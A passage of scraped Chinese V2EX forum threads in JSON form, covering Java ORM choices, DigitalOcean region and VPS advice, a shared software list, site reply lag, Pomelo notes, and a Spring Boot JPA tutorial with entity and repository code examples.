的全家桶，什么都有，反而有点凌乱的感觉", " Spring 有其他好的 ORM 解决方案吗？", " Mybatis,JOOQ 。这两种方案都有自己鲜明的特征，但在 JPA 上感觉都能找到一点影子。", "JPA 自己有一套 Criteria API 实现 Typesafe 查询， Spring Data JPA 作了封装，提供简洁的 Specification 接口。参见 ", " 中 data-jpa 目录。\r", "\r", "QueryDSL 同样支持 JPA ， Jdbc ， Mongo ， Java Collections 等数据操作。", " JOOQ 结合 Java 8  Stream, Labmda 新特性操作 Jdbc 比较方便,  QueryDSL 的 JDBC 操作也不错。 Spring Jdbc ， MyBatis 等在 Typesafe 方面显得不足。", " Criteria 的标准，投影，表连接这些操作可以吗？", " 当然可以。"]},
{"content": ["<div class=\"topic_content\">DigitalOcean 选择哪个 region 好呢？备选节点 1.new York 2.san fråncisco 3. amsterdam 4.singapore\r<br>还有一个疑问，是 Ubuntu 好呢？还是 Debian 好呢？准备上面跑一个 strongswan 服务</div>"], "reply": "48", "tittle": "DigitalOcean 选择哪个 region 好呢？", "comment": ["到国内的速度都不行……\r", "选啥发行版还是看你自己的习惯吧。", "感觉 sgp 和 san 差不多，装个锐速吧", "SF 相对来说还可以，用上 BBR.", "  之前都是用 debian 玩的，这次用 ubuntu 试试", "  @", "  听了你们的建议，准备用 SF", "具体哪个节点忘了,当时是一个节点一个节点的选择,然后测试 ping,没装 BBR 之前貌似是 200-300.装上 BBR 就是这样了\r", "教育网用的 sgp ，似乎是直连， ping 只有 60ms", "BBR 也会影响 ping 的 RTT 或 TTL 吗? ping 不是 ICMP 吗?", " 纯教育网应该绕路才对啊。。。怪了\r", "实话，哪个都不好", "我用的新加坡，开了 bbr 速度不错。就是断过一次海底光缆，那个时候速度特别不稳定", "国内都连不上。\r", "系统看个人习惯，反正都不是原版镜像。", "还是 vultr 吧", "被撸烂了 还是 2.5 刀的 vultr 吧", "其实我也认为 vultr 比较好", "哈哈，本来想问下，结果省了", "都不好，目前有个站在 sgp ，慢的要死。去程绕道日本，回程丢包严重， 202.97 丢包严重，已装 bbr 。本地 debian8+westwood", "之前测试了一大堆节点，最后还是选择 sfo1 了\r", "选 Debian 啊，上 BBR 很容易", "才帮人搭建了一个远程下载器,电信来说的话,用 vultr 比 do 好", "Vultr 日本+BBR 比较合适", "我最近也实际测试过，没有一个是好用的，都慢\r", "相对就是 sf 好点", "荷兰阿姆斯特丹 1", " 电信晚上连 amst 有时比较容易抽。", "我用伦敦的，电信走上海绕荷兰， ping200 多一点， 1080 无压力", "我这边用 London 或者 Netherland 速度很快，反而日本、美国和新加坡不行", "SF 上 BBR 速度还可以", "都是垃圾", " tracert 看了一下，学校的教育网连新加坡是走的移动出口。 ping 稳定在 60-80", " 怪不得", "我觉得新加坡的还可以  移动的网络", "我看好些人推荐 vultr ，难道 digital ocean 确实比不上 vultr 吗？\r", " \r", " \r", "联通的话， vultr 日本比 do 新加坡略好，坐标帝都。", "  已经买了 vultr 2.5$的服务,试试看效果", "西海岸 ipv6 速度贼快，不过 ipv4 国内连不上，即使能连上也非常慢。", "个人感觉 sgp 比 sf 好点，以前用 sf 虽然速度可以，但是经常因为线路问题抽风，简直月经\r", "听说 sgp 换机房后（印象中已经是 1-2 年前了），就换到了 sgp 速度差不多，基本很少抽风", " vultr 确实很好，性价比高", "还是搬瓦工吧..便宜够用...还可以用支付宝", "都很辣鸡，不过发现荷兰下载还挺快，电信大白天还能 1080 ，没事开着玩_(:з」∠)_", "sfo1", "我用 sf 已经 3 年了，感觉一直很稳定， 3 年前试过 sgp ，线路绕到美国...不知道现在什么情况", " 上海电信可以 4k 哦 766", "我有 Do 三个节点 洛杉矶 伦敦 新加坡 ", "  欢迎来测试", "推荐 debian ，小内存机器上能运行的很稳定", "当然是选三藩市的， ", "已经从 do 转到搬瓦工，国内而言， do 练接性不好", "vultr 日本 + Arch Linux 吧 哈哈", "最后 vultr 买了 tokyo 的节点，但是分配给我是美国的 ip ，有遇到这种情况的吗？\r", "北京电信 ping 美国节点 x.x.x.x\r", "好的情况下： 60ms\r", "最差情况出现： 160ms ，同时期出现 request tomeout 概率变大（这种情况概率较小，认为可以接受）\r", "目测平均情况在： 80ms 左右\r", "\r", "这种情况算不算稳定呢？"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>前两天把系统给重装了下,好像最近一次安装应该是两年前了,一般情况下不愿意再做此类耗时无聊的事情,但没法,拥有 SSD 和高配置内存,开几个 IDE 却卡成翔,系统分析折腾了老半天还是决定重装了,重装后的那个清爽真是无与伦比, 至少依旧可以在我的 Win 10 上折腾不用开发也搬迁到 MacBook 了。</p>\n<p>清爽归清爽,后续软件安装就比较折腾了,电脑上遗留的都是两年前比较老的版本了,没法只能一个一个网上查找,于是重新将自己的软件清单做下梳理和整理,才发现 IT 业的我经历了太多太多工具，工具，工具~</p>\n<p>不罗嗦了，感兴趣可以瞧瞧，原文地址 <a href=\"http://skyseraph.com/2014/08/06/Tools/IT%E7%94%9F%E6%B6%AF%EF%BC%8C%E6%88%91%E7%9A%84%E5%B8%B8%E7%94%A8%E8%BD%AF%E4%BB%B6%E6%B8%85%E5%8D%95/\" rel=\"nofollow\">http://skyseraph.com/2014/08/06/Tools/IT%E7%94%9F%E6%B6%AF%EF%BC%8C%E6%88%91%E7%9A%84%E5%B8%B8%E7%94%A8%E8%BD%AF%E4%BB%B6%E6%B8%85%E5%8D%95/</a></p>\n<p>同步更新到了 Github 上  <a href=\"https://github.com/skyseraph/Soft-Tools\" rel=\"nofollow\">https://github.com/skyseraph/Soft-Tools</a></p>\n</div></div>"], "reply": "54", "tittle": "满纸荒唐言 一把辛酸泪 “IT 生涯, 我的常用软件清单”", "comment": ["这大部分都是常用软件而已，每个人都有一份自己独特的“常用软件列表”，我不知道这玩艺儿有什么好分享的", " \r", "1. 除了常用软件还有啥？难不成兄台一直是用自己开发的工具？ 要不也分享下？\r", "2. 分享只是一种精神，无谓其它。 整理系统时顺便梳理了下，后面觉得没必要和兄台一样，把东西放在自己电脑躺着，干脆扔到网上，方便自己查看时或许也有可能对他人有一点点帮助，哪一点惹上大爷您了？", "自从开发之后，就没折腾系统", "就喜欢这种常用软件，感谢分享", "感谢， Clover 不错。", "感觉东西太多了 （就是因为这样才卡的吧）其实很多东西可以省去 比如 atom 可以作为 Markdown 编辑器（推荐一下 很好用）", "icdiff 不错，还有什么好用的 diff ？", " 你回复他本身就是对自己的一种蹂躏，对自己好点。", "谢谢楼主，只有信息共享，才有互相借鉴", "win10 自带 bash 了很多列表上的软件都不是必须的了，楼主可以尝试下。", "分享就是交流，互相进步", "楼主是玩逆向工程的？", " 回答你的第二个问题：你大概忘了你在 V2EX 写了一篇如何使安卓 app 保持在后台存活的文章结果被一堆人怒怼的事了。怎么样，最近开发出什么能绕过 冰箱 和 绿色守护 冻结机制的安卓 app 了么？", "楼上这个转进真是来得猝不及防……", " 哇，原来还被兄台默默关注了哈，受宠若惊，谢谢谢谢~\r", "最近再弄 Unity 游戏相关，没来得及研究那一块，有时间可以研究下哈~", "翻陈年旧事吵架……好搞笑哦", "目录里的 5 个都 404 了", "默默被 13 楼撒了口狗粮", "  头像不错", "我觉得这种分享还是有用的，至少我在知呼的介绍里找到不少有用的应用\r", "但是楼主的问题是介绍太简单，作为个人清单这样是够了，如果是分享介绍的话，我相信更多人喜欢图文描述的，并且能点出这软件一两出亮点的", "涨姿势了,我调试接口都是直接用 Fiddler 的", "有用，加快从系统安装到软件环境选择，有选择拖延症路过", "这么多收费版，买不起。", "然而对我来说，并没什么卵用。\r", "\r", "另外这么多软件，装上了有啥意义。\r", "\r", "软件涉及后端开发（语言从 c 跨度到**再到**再到 nodejs ，有多少个语言我就不知道了，精的能有哪个）、抓包、安全、破解、设计、产品原型，真不懂你是想干啥的。\r", "\r", "最后我只能猜测，你是搞 java 或者破解逆向的。\r", "\r", "是时候扔掉很多你不应该使用的软件了。如 axure,UML 之类的。", " 抱歉，回家再 fixed 。直接上 ", " 这个哈~", " 其实主要是方便自己快速查询用，老鸟一看就知，新人就 Google 下吧，文字类介绍有点耗时间~", " 楼主好心细，这种小众软件可能知晓的很少，不过真是良心软件，之前用了三年多，后面因为升 win10 该软件一直崩溃，作者也一年多没有修复，最近发现修复更新了，重新使用之~", "在一份 github 没有一定名气之前，就硬生生的放上捐赠，不仅不会有人捐，还会影响阅读体验。\r", "\r", "不过东西的确不错～", " \r", "哈哈，所有写上去的软件都是笔者再用或用过的，觉得不错的，现在全栈的世界，软件仅仅是工具。", "TurboLunch   将所有软件尽量绿色版  存储在一个目录  拖动图标到上面\r", "重装执行几个注册表导入 或者几个简单的脚本 恢复绝大多数的软件", " atom 好大，我还是喜欢 sublime", "v2 也开始引进喷子了？", " 有帮助可以考虑捐，没帮助就不捐咯。一定要有名气的人才能帮助别人吗？比如解决一个解决了很久都解决不了的 bug ？\r", "\r", "所以有名气的人的帮助就是帮助，没有名气的人的帮助就不是帮助吗？", " 一直。你可以关注一下分享发现节点，很多都是：\"哦，我还是喜欢用 xxx\"。", " 但 Sublime 似乎是付费软件…虽然可以忽略提示但还是觉得麻烦。 另外 atom 有好多有趣的插件，感觉这些 sublime 做不到", "基本上所有 link 都是 404,:)", "挺不错的分享，居然都有人喷\r", "不喜欢就路过好了，有什么理由要留下来喷", " 机智如你", " 我倒是觉得 atom 占用挺大的，可能我的使用程度都不深入， 233333\r", "\r", "\r", " btw ，他更新是因为他加广告了，哈哈哈，眼睛护士下载了，正在使用,thx ： P", " 哈哈哈，我觉得作者是 gh 也上传了一份用的相对路径，至少 md 文件都是。。", " Atom 确实资源占用很大…然而我的设备性能够强 23333", " 虽然我已经换电脑了，但是 atom 带给我的伤害海事很大...", "代理翻墙 XX-Net 的超链接是 sublime ？", " 谢谢建议，尝试新鲜。 已全部删除，仅保留 readme~", " \r", " \r", " \r", "各位，抱歉，博客上的链接估计有问题，回家才能修改，建议直接 github 上查阅，谢谢。\r", "错了。。老鸟才不会看这个呢，要用什么都是直接搜索。新人看看没坏处", " github 上是好的，:)", "文件搜索那个不错，很快呀，感谢分享", " 说出你的故事～", "这些很多都有绿色版呀， lz 你重装系统后很多可以直接运行的。", " 你听过 a6 大过 i5 吗", "楼主的分享不错啊，我也是有同样的想法，写了一份个人用的清单 ", "\r", "感谢分享", "挺好的软件清单 感谢", " #51 \r", "i3 战 a8 23333"]},
{"content": ["<div class=\"topic_content\">刚刚回复的一个主题..就是那个\"城里孩子都是从小学编程吗？\"的主题 !话说我回复好,然后刷新没看见..我以为我没点击回复就刷新了...于是我有埋头苦干的有开始学了更多的回复内容.....但是等我把二次重写的回复内容写好发布之后点击刷新有不见了 ..但是上一条我以为我没有点击回复发表时的内容有热回复了  ...这个延迟还有点长啊......</div>"], "reply": "6", "tittle": "v2 这玩意儿回复有延迟啊 ..你们发现了吗 v 站程序员看过来啊", "comment": ["是有延迟。 v2 需要同时服务国内和全球的用户，同步 or 缓存 会有延迟。", "在国内好像没遇到缓存。不过目测首页和列表页是有缓存的", "赞同🙌", "V 站有程序员？", "何止是回复有延迟, 感谢也有延迟好吗?", "遇到好几次了, 非得刷新一下再点一次感谢."]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>在使用 Pomelo 开发游戏的过程中，自己总结了一些 Pomelo 的一些笔记，包括部署，概念， 使用方法等，\n分享给大家，希望能帮到使用 Pomelo 的初学者。\n<a href=\"https://github.com/NextZeus\" rel=\"nofollow\">我的 gitHub 地址</a>\n<a href=\"http://nextzeus.github.io/pomelo/\" rel=\"nofollow\">文章地址</a></p>\n</div></div>"], "reply": "目前尚无回", "tittle": "Pomelo 开发笔记分享-持续更新中", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>原文地址：<a href=\"https://lufficc.com/blog/spring-boot-jpa-basic\" rel=\"nofollow\">Spring Boot JPA - 基本使用</a></p>\n<h2>什么是 JPA ？</h2>\n<p>JPA （ The Java Persistence API ）是用于访问，持久化和管理 Java 对象 /类与关系型数据库之间的数据交互的 Java 规范。 JPA 被定义为 EJB （ Enterprise JavaBeans ） 3.0 规范的一部分，作为 EJB 2 CMP 实体 Bean 规范的替代。</p>\n<p>注意， JPA 只是一个标准，只定义了一系列接口，而没有具体的实现。很多企业级框架提供了对 JPA 的实现，如 Spring 。因此 Spring 本身与 JPA 无关，只是提供了对 JPA 的支持，因此在 Spring 中你也会看到很多注解都是属于 <code>javax.persistence</code> 包的。</p>\n<p>JPA 允许 <a href=\"https://en.wikipedia.org/wiki/POJO\" rel=\"nofollow\">POJO</a>（ Plain Old Java Objects ）轻松地持久化，而不需要类来实现 EJB 2 CM P 规范所需的任何接口或方法。 JPA 还允许通过<strong>注解</strong>或 XML 定义对象的关系映射，定义 Java 类如何映射到关系数据库表。 JPA 还定义了一个运行时 <code>EntityManager</code>  API ，用于处理对象的查询和管理事务。 同时， JPA 定义了对象级查询语言 <strong>JPQL</strong>，以允许从数据库中查询对象，实现了对数据库的解耦合，提高了程序的可移植性，而不具体依赖某一底层数据库。</p>\n<p>JPA 是 Java 持久化规范中的一个最新版本。第一个版本是 OMG 持久性服务 Java 绑定，但这个一个失败的产品，甚至没有任何商业产品支持它。接下来的版本是 EJB 1.0 CMP Entity Beans ，它已经非常成功地被大型 Java EE 提供程序（ BEA ， IBM ）采用，但是它复杂性太高而且性能比较差。 EJB 2.0 CMP 试图通过引入本地接口来减少 Entity Bean 的一些复杂性，但是大多数复杂性仍然存在,而且缺乏可移植性。</p>\n<p>历史总是要向前发展的，种种的这些使得 EJB 3.0 规范将降低复杂性作为主要目标，这导致规范委员会沿着 JPA 的路径前进。 JPA 旨在统一 EJB 2 CMP ， JDO ， Hibernate ，从目前来看， JPA 的确取得了成功。</p>\n<p>目前大多数持久化供应商已经发布了 JPA 的实现，并被行业和用户采用。这些包括 Hibernate （由 JBoss 和 Red Hat 收购）， TopLink （由 Oracle 收购）和 Kodo JDO （由 BEA 和 Oracle 收购）。其他支持 JPA 的产品包括 Cocobase （由 Thought Inc. 收购）和 JPOX 。</p>\n<h2>定义实体类</h2>\n<h4>依赖</h4>\n<p>在 Spring Boot 中引入 Spring Data JPA 很简单，在 <code>pom.xml</code> 中加入依赖即可：</p>\n<pre><code>&lt;dependency&gt;\n\t\t&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\n\t\t&lt;artifactId&gt;spring-boot-starter-data-jpa&lt;/artifactId&gt;\n&lt;/dependency&gt;\n</code></pre>\n<h4>Model</h4>\n<p>如果具体的 SQL 语句来创建数据库表，就会和具体的底层数据库产生耦合。在 Springl Boot 中，我们可以定义一系列 Entity ，来实现 Java 对象到 数据表的映射。</p>\n<p>加入我们的数据表有一些公用的属性，我们可以定义一个超类，来声明这些公用属性。<code>@MappedSuperclass</code> 注解表明实体是一个超类，保证不会被 Spring 实例化 （保险起见加上<code>abstract</code>）：</p>\n<pre><code>@MappedSuperclass\npublic abstract class BaseModel implements Serializable {\n\t/**\n\t *\n\t */\n\tprivate static final long serialVersionUID = 1782474744437162148L;\n\t@Id\n\t@GeneratedValue(strategy = GenerationType.IDENTITY)\n\t@Column(name = \"ID\")\n\tprivate Long id;\n\n\tpublic Long getId() {\n\t\treturn id;\n\t}\n\n\tpublic void setId(Long id) {\n\t\tthis.id = id;\n\t}\n\n\t@Override\n\tpublic boolean equals(Object o) {\n\t\tif (this == o) return true;\n\t\tif (o == null || getClass() != o.getClass()) return false;\n\n\t\tBaseModel baseModel = (BaseModel) o;\n\n\t\treturn id != null ? id.equals(baseModel.id) : baseModel.id == null;\n\t}\n\n\t@Override\n\tpublic int hashCode() {\n\t\treturn id != null ? id.hashCode() : 0;\n\t}\n}\n</code></pre>\n<p><code>@Id</code> 表明实体主键为整数类型，<code>@GeneratedValue</code> 表明主键值生成策略，<code>strategy</code> 可选值为 <code>TABLE</code>， <code>SEQUENCE</code>， <code>IDENTITY</code>，<code>AUTO</code> 。如果我们想对列加上更多的限制，可以使用 <code>@Column</code> 注解，<code>@Column</code> 可以制定列的属性有：<code>name</code>，列名；<code>unique</code> ,是否为一；<code>nullable</code> ，是否为空；<code>length</code> ,长度；<code>columnDefinition</code>，列定义，如 <code>TEXT</code> 类型；等等。</p>\n<p>注意，列名和表名到数据库的映射策略，定义在 <code>org.hibernate.boot.model.naming</code> 包下，你也可以定义自己的映射策略，然后修改 application.yml  <code>spring.jpa.hibernate.naming.physical-strategy</code> 的属性即可。</p>\n<h4>关系</h4>\n<p>以一个简单博客系统来说明吧，包括用户，文章，分类，标签四个表。用户与文章是一对多，一个用户可以有多篇文章；分类与文章也是一对多，文章与标签是多对多：\n<code>User</code> 表：</p>\n<pre><code>@Entity\n@Table\npublic class User extends BaseModel {\n    private String name;\n    private String email;\n    private String address;\n\n    @OneToMany(mappedBy = \"user\")\n    private List&lt;Post&gt; posts;\n\n    public String getName() {\n        return name;\n    }\n\n    public void setName(String name) {\n        this.name = name;\n    }\n\n    public String getEmail() {\n        return email;\n    }\n\n    public void setEmail(String email) {\n        this.email = email;\n    }\n\n    public String getAddress() {\n        return address;\n    }\n\n    public void setAddress(String address) {\n        this.address = address;\n    }\n\n    public List&lt;Post&gt; getPosts() {\n        return posts;\n    }\n\n    public void setPosts(List&lt;Post&gt; posts) {\n        this.posts = posts;\n    }\n}\n</code></pre>\n<p><code>@OneToMany</code> 声明了 <code>User</code> 和 <code>Post</code> 的一对多关系，<code>mappedBy</code> 指明了 <code>Post</code> 类中维持该关系的字段名称是 <code>user</code> ，即 <code>Post</code> 表中的 <code>user</code> 字段：\n<code>Post</code> 表：</p>\n<pre><code>@Entity\n@Table\npublic class Post extends BaseModel {\n\tprivate String title;\n\n\t@Column(columnDefinition = \"TEXT\")\n\tprivate String content;\n\n\t@ManyToOne\n\t@JoinColumn(name = \"category_id\")\n\tprivate Category category;\n\n\t@ManyToMany\n\t@JoinTable(name = \"post_tag\", joinColumns = @JoinColumn(name = \"post_id\"), inverseJoinColumns = @JoinColumn(name = \"tag_id\"))\n\tprivate Set&lt;Tag&gt; tags;\n\n\tprivate Date createdAt;\n\n\t@ManyToOne\n\t@JoinColumn(name = \"user_id\")\n\tprivate User user;\n\n\tpublic String getTitle() {\n\t\treturn title;\n\t}\n\n\tpublic void setTitle(String title) {\n\t\tthis.title = title;\n\t}\n\n\tpublic String getContent() {\n\t\treturn content;\n\t}\n\n\tpublic void setContent(String content) {\n\t\tthis.content = content;\n\t}\n\n\tpublic Category getCategory() {\n\t\treturn category;\n\t}\n\n\tpublic void setCategory(Category category) {\n\t\tthis.category = category;\n\t}\n\n\tpublic User getUser() {\n\t\treturn user;\n\t}\n\n\tpublic void setUser(User user) {\n\t\tthis.user = user;\n\t}\n\n\tpublic Date getCreatedAt() {\n\t\treturn createdAt;\n\t}\n\n\tpublic void setCreatedAt(Date createdAt) {\n\t\tthis.createdAt = createdAt;\n\t}\n\n\tpublic Set&lt;Tag&gt; getTags() {\n\t\treturn tags;\n\t}\n\n\tpublic void setTags(Set&lt;Tag&gt; tags) {\n\t\tthis.tags = tags;\n\t}\n}\n</code></pre>\n<p><code>Post</code> 类中，因为 <code>User</code> 和 <code>Post</code> 的一对多关系，所以 <code>user</code> 字段加上了 <code>@JoinColumn(name = \"user_id\")</code>，表明会在 <code>Post</code> 表中新增加一列 <code>user_id</code> ，因为一对多关系大多数会在“多”的一方加入“一”那一方的主键来做外键（如果不加 <code>@JoinColumn(name = \"user_id\")</code> ， JPA 会默认新建一个表来维持这种关系）。\n<code>Tag</code> 表：</p>\n<pre><code>@Entity\n@Table\npublic class Tag extends BaseModel {\n\tprivate String name;\n\n\t@ManyToMany\n\t@JoinTable(name = \"post_tag\", joinColumns = @JoinColumn(name = \"tag_id\"), inverseJoinColumns = @JoinColumn(name = \"post_id\"))\n\tprivate Set&lt;Post&gt; users = new HashSet&lt;&gt;();\n\n\tpublic String getName() {\n\t\treturn name;\n\t}\n\n\tpublic void setName(String name) {\n\t\tthis.name = name;\n\t}\n\n\tpublic Set&lt;Post&gt; getUsers() {\n\t\treturn users;\n\t}\n\n\tpublic void setUsers(Set&lt;Post&gt; users) {\n\t\tthis.users = users;\n\t}\n}\n</code></pre>\n<p>来说一下多对多，多对多需要一个额外的表来保持关系，所以 <code>Post</code> 和 <code>Tag</code> 表都使用了 <code>@JoinTable</code> 注解。其中 <code>name</code> 指的是额外表的名称，当前是 <code>post_tag</code>，<code>joinColumns</code> 指的是当前当前表的主键在额外的表中的名称，如 <code>tag_id</code> 表明  <code>Tag</code>  的 ID 在 <code>post_tag</code> 中名称为  <code>tag_id</code> 。<code>inverseJoinColumns</code> 与 <code>joinColumns</code> 正好相反，<code>Post</code> 和 <code>Tag</code> 中他们的属性正好相反。</p>\n<h2>Repository</h2>\n<h4>核心概念</h4>\n<p>Spring Data 中最核心的一个接口是 <code>Repository</code> 接口，这是一个空接口，就像 <code>Serializable</code> 接口一样只提供一个标识，供 Spring 动态代理其方法（或者路由到接口的实现上）。实质上，<code>Repository</code> 只是为了获取 Domain Class 和  Domain Class 的 ID 类型等信息。</p>\n<p>但是只提供给开发者一个空接口太不负责了！所以 Spring 内置提供了 <code>CrudRepository</code> （继承自 <code>Repository</code>，<code>Crud</code> 的意思是增删改查等基本操作）,这样我们可以对数据库进行基本的操作。每个方法的意思不用注释，应该能根据它的方法名，参数，返回类型来判断吧：</p>\n<pre><code>public interface CrudRepository&lt;T, ID extends Serializable&gt;\n    extends Repository&lt;T, ID&gt; {\n\n    &lt;S extends T&gt; S save(S entity); \n\n    T findOne(ID primaryKey);       \n\n    Iterable&lt;T&gt; findAll();          \n\n    Long count();                   \n\n    void delete(T entity);          \n\n    boolean exists(ID primaryKey);  \n\n    // … more functionality omitted.\n}\n</code></pre>\n<p>当然继承自 <code>CrudRepository</code> 的有一个 <code>PagingAndSortingRepository</code> ，提供了基本的分页操作。</p>\n<pre><code>public interface PagingAndSortingRepository&lt;T, ID extends Serializable&gt;\n  extends CrudRepository&lt;T, ID&gt; {\n\n  Iterable&lt;T&gt; findAll(Sort sort);\n\n  Page&lt;T&gt; findAll(Pageable pageable);\n}\n</code></pre>\n<p>因此在项目中我们可以根据需要继承 <code>Repository</code> ，<code>CrudRepository</code> ，<code>PagingAndSortingRepository</code> 或者 <code>JpaRepository</code> （停供了一些批量操作，如批量删除、增加）。如果你想为项目中所有 <code>Repository</code> 创建一个自定义的基 <code>Repository</code> 来让所有继承自该接口的接口共享方法，可以使用 <code>@NoRepositoryBean</code> 注解，内置的 <code>PagingAndSortingRepository</code> 或者 <code>JpaRepository</code> 也都加了  <code>@NoRepositoryBean</code> <code>@NoRepositoryBean</code> 注解，这表明 Spring 不会在运行时动态生成该接口的实例：</p>\n<pre><code>@NoRepositoryBean\ninterface MyBaseRepository&lt;T, ID extends Serializable&gt; extends Repository&lt;T, ID&gt; {\n\n  T findOne(ID id);\n\n  T save(T entity);\n\t\n  T customSharedMethod(String arg);\n}\n\ninterface UserRepository extends MyBaseRepository&lt;User, Long&gt; {\n  User findByEmailAddress(EmailAddress emailAddress);\n}\n</code></pre>\n<p>注意到 <code>findOne(…)</code> 和 <code>save(…)</code> 方法 Spring 在 <code>SimpleJpaRepository</code> 类中已经有了实现，所以调用这些方法时会路由到 <code>SimpleJpaRepository</code> 中对用的方法，而自定义的  <code>SimpleJpaRepository</code> 中不存在方法如 <code>T customSharedMethod(String arg)</code> 会由 Spring 动态代理来执行。</p>\n<p>因为 Spring 内置的方法 <code>Repository</code>s 不可能满足我们所有的需求，所以在 <code>Repository</code> 中自定义自己的方法是必不可少的。</p>\n<p>那么问题来了，我们自定义的方法， Spring 怎么知道如何去执行呢？ Spring 有一套自己的查找策略。</p>\n<p>如果你的方法签名比较简单，像 <code>findOne(…)</code> 或者 <code>save(…)</code> ，这些方法的执行会被路由到 <code>SimpleJpaRepository</code> 中对应的方法去执行。而其他的 Spring 则利用自己的机制来解析。</p>\n<p>机制首先找到方法名的 <code>find … By</code>, <code>read … By</code>, <code>query … By</code>, <code>count … By</code>, 或者 <code>get … By</code> 前缀，接着解析剩下的部分。<code>...</code> 的位置亦可以插入一些高级的表达式，如 <code>Distinct</code> 。注意，<code>By</code> 是前缀和真正实体属性的分隔符，<code>By</code> 后面可以添加多个属性，用 <code>And</code> 或者 <code>Or</code> 连接。\n例如：</p>\n<pre><code>public interface PersonRepository extends Repository&lt;User, Long&gt; {\n\n  // 可以直接根据另一个关联实体进行查找\n  List&lt;Person&gt; findByEmailAddressAndLastname(EmailAddress emailAddress, String lastname);\n\n  // 查找非重复行\n  List&lt;Person&gt; findDistinctPeopleByLastnameOrFirstname(String lastname, String firstname);\n  List&lt;Person&gt; findPeopleDistinctByLastnameOrFirstname(String lastname, String firstname);\n\n  // 忽略大小写\n  List&lt;Person&gt; findByLastnameIgnoreCase(String lastname);\n  List&lt;Person&gt; findByLastnameAndFirstnameAllIgnoreCase(String lastname, String firstname);\n\n  // 按 Firstname 排序\n  List&lt;Person&gt; findByLastnameOrderByFirstnameAsc(String lastname);\n  List&lt;Person&gt; findByLastnameOrderByFirstnameDesc(String lastname);\n}\n</code></pre>\n<h4>属性表达式</h4>\n<p>属性表达式（ Property Expressions ）只能指向被 <code>Repository</code> 管理的实体的属性，但是也可以指向实体的属性的嵌套属性：假设 <code>Person</code> 有一个 <code>Address</code> 属性，<code>Address</code> 有一个 <code>ZipCode</code> 属性，那么我们可以根据 <code>ZipCode</code> 来查找 <code>Person</code>：</p>\n<pre><code>List&lt;Person&gt; findByAddressZipCode(ZipCode zipCode);\n</code></pre>\n<p>这会判断 <code>x.address.zipCode</code> 是否和 <code>zipCode</code> 相等（根据 <code>ZipCode</code> 的主键来判断 ）。具体的解析策略是： Spring 检测到整个属性表达式 <code>AddressZipCode</code> ( <code>By</code> 后面)  ，然后判断实体类是否有 <code>addressZipCode</code> 这个属性，如果有，则算法停止，使用该属性；否则，算法根据驼峰命名规则，从右边将该属性分为“头”和“尾”两部分，例如 <code>AddressZip</code> 和 <code>Code</code>。如果实体类拥有“头”所指示的属性，然后 Spring 会从此处开始，按照刚才的方法将“尾”拆分，来递归判断是否属于“头”的属性。如果第一次拆分实体类没有“头”所指示的属性，则算法左移一步，拆分为 <code>Address</code> 和 <code>ZipCode</code> 然后继续。</p>\n<p>大所述情况下该算法都会正常工作，但也有例外。比如 <code>Person</code> 有 <code>addressZip</code> 属性，但是 <code>AddressZip</code> 没有 <code>code</code> 属性，因此就会在第一次分割后失败。这种情况下，我们可以使用 <code>_</code> 显示分割：</p>\n<pre><code>List&lt;Person&gt; findByAddress_ZipCode(ZipCode zipCode);\n</code></pre>\n<h4>其他</h4>\n<p>我们还可以传 <code>Pageable</code> 和 <code>Sort</code> 参数来实现分页和排序：</p>\n<pre><code>Page&lt;User&gt; findByLastname(String lastname, Pageable pageable);\n\nSlice&lt;User&gt; findByLastname(String lastname, Pageable pageable);\n\nList&lt;User&gt; findByLastname(String lastname, Sort sort);\n\nList&lt;User&gt; findByLastname(String lastname, Pageable pageable);\n</code></pre>\n<p>还可以使用 <code>first</code> 或者 <code>top</code> 限制返回结果的个数：</p>\n<pre><code>User findFirstByOrderByLastnameAsc();\n\nUser findTopByOrderByAgeDesc();\n\nPage&lt;User&gt; queryFirst10ByLastname(String lastname, Pageable pageable);\n\nSlice&lt;User&gt; findTop3ByLastname(String lastname, Pageable pageable);\n\nList&lt;User&gt; findFirst10ByLastname(String lastname, Sort sort);\n\nList&lt;User&gt; findTop10ByLastname(String lastname, Pageable pageable);\n</code></pre>\n<p>可以返回 Java 8 的 <code>Stream</code> 对象：</p>\n<pre><code>@Query(\"select u from User u\")\nStream&lt;User&gt; findAllByCustomQueryAndStream();\n\nStream&lt;User&gt; readAllByFirstnameNotNull();\n\n@Query(\"select u from User u\")\nStream&lt;User&gt; streamAllPaged(Pageable pageable);\n</code></pre>\n<p>注意，使用 <code>Stream</code> 之后必须手动关闭，或者这样写：</p>\n<pre><code>try (Stream&lt;User&gt; stream = repository.findAllByCustomQueryAndStream()) {\n  stream.forEach(…);\n}\n</code></pre>\n<p>还可以返回异步加载的对象：</p>\n<pre><code>//使用 java.util.concurrent.Future 作为返回对象.\n@Async\nFuture&lt;User&gt; findByFirstname(String firstname);               \n\n//使用 Java 8 java.util.concurrent.CompletableFuture 作为返回对象.\n@Async\nCompletableFuture&lt;User&gt; findOneByFirstname(String firstname); \n\n//使用 org.springframework.util.concurrent.ListenableFuture 作为返回对象.\n@Async\nListenableFuture&lt;User&gt; findOneByLastname(String lastname);    \n</code></pre>\n<h2>附录</h2>\n<h4>方法名支持的关键字</h4>\n<p>看原文吧， V2EX 不支持表格？</p>\n<h4>方法支持的返回值</h4>\n<p>看原文吧， V2EX 不支持表格？</p>\n<h2>参考</h2>\n<ol>\n<li><a href=\"https://en.wikibooks.org/wiki/Java_Persistence/What_is_JPA%3F\" rel=\"nofollow\">Java Persistence/What is JPA?</a></li>\n<li><a href=\"http://docs.spring.io/spring-data/jpa/docs/2.0.0.M1/reference/html/\" rel=\"nofollow\">Spring Data JPA - Reference Documentation</a></li>\n<li><a href=\"http://www.querydsl.com/static/querydsl/latest/reference/html_single/\" rel=\"nofollow\">Querydsl Reference Guide</a></li>\n</ol>\n</div></div>"], "reply": "8", "tittle": "Spring Boot JPA - 基本使用", "comment": ["可以用 Lombok 简化 bean 的 getter setter 的写法", " 嗯。。。 DEMO 演示，没用", "mybatis 跟这个有啥区别", " 之前和朋友交流过 Lombok ，他表示这东西用了非公开的 api ，有风险，你怎么看？", "Repository ， CrudRepository ， PagingAndSortingRepository  来自 Spring Data Commons 包， Spring Data JPA 有另外一个 JPARepository 接口。。。\r", "\r", "Spring Data JPA 支持 Type Safe 查询，支持 QueryDSL ，和自定义的 Specifcation 接口（基于 